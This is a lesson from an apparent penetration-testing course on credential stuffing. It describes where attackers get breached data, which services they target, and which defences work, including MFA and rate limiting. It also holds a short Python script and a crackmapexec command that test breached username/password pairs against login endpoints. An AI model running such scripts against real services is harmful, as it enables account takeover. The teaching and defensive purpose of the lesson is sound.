# Credential Stuffing

## Unit 4 - Topic 5 | Password Attacks

---

## Overview

**Credential stuffing** uses previously breached username/password pairs to attempt login on different services. It exploits the fact that users frequently reuse passwords across multiple platforms — a breached LinkedIn password may work on corporate VPN.

---

## 1. How Credential Stuffing Works

```
CREDENTIAL STUFFING FLOW:

1. DATA BREACH OCCURS
   └── LinkedIn breach: john@target.com:MyP@ss2023!

2. ATTACKER OBTAINS BREACH DATA
   └── From: breached databases, dark web, paste sites

3. CREDENTIAL REUSE TESTING
   ├── Try john@target.com:MyP@ss2023! on:
   │   ├── Corporate VPN        → SUCCESS ✅
   │   ├── Microsoft 365        → SUCCESS ✅
   │   ├── AWS Console          → FAILED ❌ (different password)
   │   ├── GitHub Enterprise    → SUCCESS ✅
   │   └── Slack                → SUCCESS ✅
   └── Same password works on 4 out of 5 services!

4. IMPACT
   └── Full corporate access from one reused password
```

---

## 2. Credential Stuffing Tools

```bash
# === FINDING BREACHED CREDENTIALS ===
# Check HIBP for target emails:
# haveibeenpwned.com/API/v3

# DeHashed:
# dehashed.com — search by email domain

# === SENTRY MBA (Automated Stuffing) ===
# GUI-based credential testing tool
# Supports: HTTP, custom protocols

# === CUSTOM PYTHON SCRIPT ===
# For authorized pen testing only:
import requests

credentials = [
    ("john@target.com", "MyP@ss2023!"),
    ("jane@target.com", "Summer2022!"),
    ("bob@target.com", "Welcome1!"),
]

for user, passwd in credentials:
    r = requests.post("https://vpn.target.com/login",
                      data={"username": user, "password": passwd})
    if "Dashboard" in r.text:
        print(f"[+] VALID: {user}:{passwd}")
    else:
        print(f"[-] Failed: {user}")

# === CRACKMAPEXEC WITH CRED PAIRS ===
# File format (credentials.txt):
# john@target.com:MyP@ss2023!
# jane@target.com:Summer2022!

crackmapexec smb target.com -u john@target.com -p "MyP@ss2023!"
```

---

## 3. Credential Stuffing vs Other Attacks

| Attack | Accounts | Passwords | Source |
|--------|:--------:|:---------:|--------|
| **Brute Force** | 1 | All possible | Generated |
| **Dictionary** | 1 | Wordlist | Generic list |
| **Spraying** | Many | 1-3 | Common patterns |
| **Stuffing** | Many | Known pairs | Breach data |

---

## 4. Services to Test

```
PRIORITY TARGETS FOR CREDENTIAL STUFFING:

REMOTE ACCESS:
├── VPN portal (Cisco, Fortinet, Palo Alto)
├── Citrix Gateway
├── RDP Gateway
└── SSH bastion host

EMAIL:
├── Outlook Web Access (OWA)
├── Microsoft 365
├── Google Workspace
└── Email client (IMAP/POP3)

CLOUD SERVICES:
├── AWS Console
├── Azure Portal
├── GCP Console
└── SaaS applications (Salesforce, etc.)

INTERNAL:
├── Active Directory (domain login)
├── Internal web applications
├── Code repositories (GitHub, GitLab)
├── CI/CD systems (Jenkins, TeamCity)
└── Monitoring dashboards (Grafana, Kibana)
```

---

## 5. Detection and Defense

| Defense | Implementation |
|---------|----------------|
| **MFA** | Blocks even valid passwords |
| **Password managers** | Unique password per service |
| **Breach monitoring** | Alert when creds appear in breaches |
| **Rate limiting** | Slow down login attempts |
| **CAPTCHAs** | Block automated attempts |
| **Credential screening** | Check against known breaches (HIBP API) |
| **Anomaly detection** | Alert on unusual login patterns |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Stuffing** | Reuse breached credentials across services |
| **Password reuse** | Most users reuse passwords |
| **Breach data** | HIBP, DeHashed for source data |
| **Targets** | VPN, email, cloud, internal apps |
| **Defense** | MFA is the most effective countermeasure |
| **Difference** | Known credential pairs, not guessing |

---

## Quick Revision Questions

1. **What makes credential stuffing different from dictionary attacks?**
2. **Why does credential stuffing have a high success rate?**
3. **What services should you test with breached credentials?**
4. **What is the most effective defense against credential stuffing?**
5. **Where do attackers obtain breached credential data?**

---

[← Previous: Password Spraying](04-password-spraying.md) | [Next: Hash Cracking Basics →](06-hash-cracking-basics.md)

---

*Unit 4 - Topic 5 of 7 | [Back to README](../README.md)*
